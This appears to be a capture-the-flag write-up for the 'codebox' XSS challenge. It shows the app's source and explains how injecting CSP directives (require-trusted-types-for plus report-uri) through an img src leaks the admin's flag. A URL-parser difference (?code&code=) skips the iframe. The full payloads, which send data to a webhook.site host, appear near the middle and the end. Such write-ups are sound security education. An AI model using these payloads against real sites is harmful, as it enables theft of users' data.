## Skills required: Focusing on what's important, reading documentation, appreciating URL parsing differences

I was lucky enough to solve this challenge. ~~This further strengthens my position as professional hint elicitor<sup>[1]</sup>.~~

This is a standard XSS challenge, which we have to exfiltrate admin's flag by sending a link exploiting a vulnerable web application.
In this challenge:
- we can render HTML inside a sandboxed iframe, which should be air-tight (to my knowledge) as it doesn't allow [many stuffs, including running any javascript](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox)
- the flag is in admin's localStorage, which is injected into DOM outside the sandboxed iframe

<details>
<summary>Frontend source (really short):</summary>

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <title>codebox</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    /* not important, omitted */
  </style>
</head>
<body>
  <div id="content">
    <h1>codebox</h1>
    <p>Codebox lets you test your own HTML in a sandbox!</p>
    <br>
    <form action="/" method="GET">
        <textarea name="code" id="code"></textarea>
        <br><br>
        <button>Create</button>
    </form>
    <br>
    <br>
  </div>
  <div id="flag"></div>
</body>
<script>
    const code = new URL(window.location.href).searchParams.get('code');
    if (code) {
        const frame = document.createElement('iframe');
        frame.srcdoc = code;
        frame.sandbox = '';
        frame.width = '100%';
        document.getElementById('content').appendChild(frame);
        document.getElementById('code').value = code; 
    }

    const flag = localStorage.getItem('flag') ?? "flag{test_flag}";
    document.getElementById('flag').innerHTML = `<h1>${flag}</h1>`;
  </script>
</html>
```
</details>

<details>
<summary>Backend source (really short):</summary>

```js
const fastify = require('fastify')();
const HTMLParser = require('node-html-parser');

const box = require('fs').readFileSync('box.html', 'utf-8');

fastify.get('/', (req, res) => {
    const code = req.query.code;
    const images = [];

    if (code) {
        const parsed = HTMLParser.parse(code);
        for (let img of parsed.getElementsByTagName('img')) {
            let src = img.getAttribute('src');
            if (src) {
                images.push(src);
            }
        }
    }

    const csp = [
        "default-src 'none'",
        "style-src 'unsafe-inline'",
        "script-src 'unsafe-inline'",
    ];

    if (images.length) {
        csp.push(`img-src ${images.join(' ')}`);
    }

    res.header('Content-Security-Policy', csp.join('; '));

    res.type('text/html');
    return res.send(box);
});

fastify.listen({ host: '0.0.0.0', port: 8080 });
```

</details>

The only thing weird at first sight was **[CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) injection**.
Not very familiar with CSPs, I attempted to:
- Override existing fields like `script-src`, which is ignored by the browser. We tried [overriding CSP with `script-src-elem` as we looked at this article by PortSwigger](https://portswigger.net/research/bypassing-csp-with-policy-injection) - it's an inspiring read but not very useful in this particular case as the in page script block won't run.
- Bypass iframe sandbox with CSP - I gave up several some futile attempts (which was right in retrospect)
- Use the sandboxed iframe, as I can inject things like `frame-src *; frame-ancestor: *;`, but without javascript execution things are tough.

Running out of ideas, I resorted to standard puzzle-solving techniques:
- CSP injection is *really* important, I should look at CSPs more thoroughly
- I cannot modify the page source as it's directly served from a file, no extra javascript, style or font
- Rendering the page within the iframe is probably not meaningful as javascript cannot be run [no matter how deep I go](https://csplite.com/csp/test27/)
- I need to exfiltrate data
  - It's very unlikely that I'll do it in JavaScript
  - So I need to exfiltrate DOM content?

After lots of reading I came across the *deprecated* [report-uri CSP directive](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri).
It allows me exfiltrate some irrelevant data upon CSP violations:

`<img src="x; report-uri https://webhook.site/135c5cc5-5864-416f-85af-93a41a9cbdb2">`
```json
{
  "csp-report": {
    "document-uri": "about",
    "referrer": "",
    "violated-directive": "img-src",
    "effective-directive": "img-src",
    "original-policy": "default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src x; report-uri https://webhook.site/135c5cc5-5864-416f-85af-93a41a9cbdb2",
    "disposition": "enforce",
    "blocked-uri": "https://codebox.mc.ax/x;%20report-uri%20https://webhook.site/135c5cc5-5864-416f-85af-93a41a9cbdb2",
    "status-code": 0,
    "script-sample": ""
  }
}
```

Then I looked further more on [what fields are present in the report](https://www.w3.org/TR/CSP/#deprecated-serialize-violation).
One caught my attention.

![sample1](https://user-images.githubusercontent.com/114584910/217045928-2e27cc56-2a58-4c70-890b-61b73811503f.png)
![sample2](https://user-images.githubusercontent.com/114584910/217045947-8ca10aa0-9084-4677-9404-627de2cc7c34.png)

We are getting closer in exfiltrating things, but it isn't enough. With even more reading I came across the *experimental* [require-trusted-types-for CSP directive](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/require-trusted-types-for). It is very interesting because it allowed developers to partially block XSS.

![experimental require-trusted-types-for](https://user-images.githubusercontent.com/114584910/217045763-9daf8313-2df7-41cd-8c3c-633c89ac8ba0.png)

After looking at the *[specification](https://w3c.github.io/trusted-types/dist/spec/)* I was sure that I've hit the jackpot:

![nice sample!](https://user-images.githubusercontent.com/114584910/217045663-28e51c41-09e4-4791-beea-82121e67a412.png)

I could craft a payload, but it did something quite unexpected:

`<img src="x;require-trusted-types-for 'script';report-uri https://webhook.site/135c5cc5-5864-416f-85af-93a41a9cbdb2">`
```json
{
  "csp-report": {
    "document-uri": "https://codebox.mc.ax/?code=%3Cimg+src%3D%22x%3Brequire-trusted-types-for+%27script%27%3Breport-uri+https%3A%2F%2Fwebhook.site%2F135c5cc5-5864-416f-85af-93a41a9cbdb2%22%3E",
    "referrer": "https://codebox.mc.ax/?code=%3Cimg+src%3D%22x%3Brequire-trusted-types-for+script%3Breport-uri+https%3A%2F%2Fwebhook.site%2F135c5cc5-5864-416f-85af-93a41a9cbdb2%22%3E",
    "violated-directive": "require-trusted-types-for",
    "effective-directive": "require-trusted-types-for",
    "original-policy": "default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src x;require-trusted-types-for 'script';report-uri https://webhook.site/135c5cc5-5864-416f-85af-93a41a9cbdb2",
    "disposition": "enforce",
    "blocked-uri": "trusted-types-sink",
    "line-number": 50,
    "column-number": 22,
    "source-file": "https://codebox.mc.ax/",
    "status-code": 200,
    "script-sample": "HTMLIFrameElement srcdoc|<img src=\"x;require-trusted-types-for 's"
  }
}
```

With simple double checking, `require-trusted-types-for` affect `srcdoc` as well.

![CSP affects iframe srcdoc](https://user-images.githubusercontent.com/114584910/217045394-27b32cab-dc00-4191-9136-5f3898ff99e5.png)

I was a bit stumped but having faith that I was close, I raised a ticket roughly as follows:

> :raccoon:: I've come across some experimental features in my CSP search - I'm not sure if it's supported by the browser admin's using

> 🚩: admin's using latest puppeteer, which uses latest stable headless chrome

> :raccoon:: I can receive back first 40 characters of my `srcdoc` - I think I'm close but I'll try harder

> 🚩: if it works locally in latest chrome, it *should* work in admin

> :raccoon:: 😃

So now I could either:
1. Block the `frame.srcdoc = code;` part with some fancy CSPs, or
2. Don't execute `frame.srcdoc = code;`, i.e. make `code` falsy in frontend, but still inject the CSPs.

The second idea worked as I recalled [Orange Tsai's very inspiring presentation on URL parsing differences](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf). Pwnfunction made a [video](https://youtu.be/QVZBl8yxVX0) about the topic as well.

It's easy to confirm that `req.query.code` takes the *last* value, while `new URL(window.location.href).searchParams.get('code')` takes the *first*.
Namely we can use `?code=&code=<payload>` to skip the iframe creation and go straight to the flag and win.

Final Payload: `https://codebox.mc.ax/?code&code=%3Cimg+src%3D%22x%3Brequire-trusted-types-for+%27script%27%3Breport-uri+https%3A%2F%2Fwebhook.site%2F135c5cc5-5864-416f-85af-93a41a9cbdb2%22%3E`

<sup>[1]</sup>: I strictly play by the rules and only raise valid and non-intrusive tickets.
